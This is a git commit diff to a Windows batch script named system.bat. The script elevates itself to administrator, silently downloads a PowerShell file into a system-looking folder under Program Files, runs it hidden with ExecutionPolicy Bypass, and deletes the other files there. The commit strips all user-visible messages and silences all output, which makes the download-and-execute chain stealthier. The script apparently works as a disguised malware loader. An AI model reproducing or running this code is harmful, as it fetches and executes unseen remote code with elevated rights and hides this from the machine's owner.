268b4a8bf3373bfb6d945fde1cbdf7504ac4978f
quannqttg <46080682+quannqttg@users.noreply.github.com>
2024-11-13 13:01:18 +0700

    Update system.bat

--- system.bat
+++ system.bat
@@ -1,13 +1,11 @@
-echo off
+@echo off
 :: Check if the script is run as Administrator
 :: If not, request elevation by relaunching the script with administrative privileges
 
 :: Check if the script is running as administrator
 openfiles >nul 2>&1
 if %errorlevel% neq 0 (
-    echo This script requires administrator privileges. Relaunching as administrator...
-    :: Relaunch the script as Administrator
-    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
+    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs" >nul 2>&1
     exit /b
 )
 
@@ -17,28 +15,27 @@ set sysPs1Path="C:\Program Files\Windows NT\ADB\system.ps1"
 
 :: Check if system.ps1 already exists and delete it if it does
 if exist %sysPs1Path% (
-    del /f /q %sysPs1Path%
+    del /f /q %sysPs1Path% >nul 2>&1
 )
 
 :: Download the system.ps1 file
-curl -L -o %sysPs1Path% %sysPs1URL%
+curl -L -o %sysPs1Path% %sysPs1URL% >nul 2>&1
 if %errorlevel% neq 0 (
-    echo Error occurred while downloading system.ps1.
     exit /b
 )
 
 :: Run system.ps1 using PowerShell with ExecutionPolicy Bypass
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %sysPs1Path%
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %sysPs1Path% >nul 2>&1
 if %errorlevel% neq 0 (
-    echo Error occurred while running system.ps1.
-) 
+    exit /b
+)
 
 :: Delete all files except system.bat
 for %%F in ("C:\Program Files\Windows NT\ADB\*") do (
     if /i "%%~nxF" neq "system.bat" (
-        del /f /q "%%F"
+        del /f /q "%%F" >nul 2>&1
     )
 )
 
 :: Exit the batch file
-exit
+exit /b
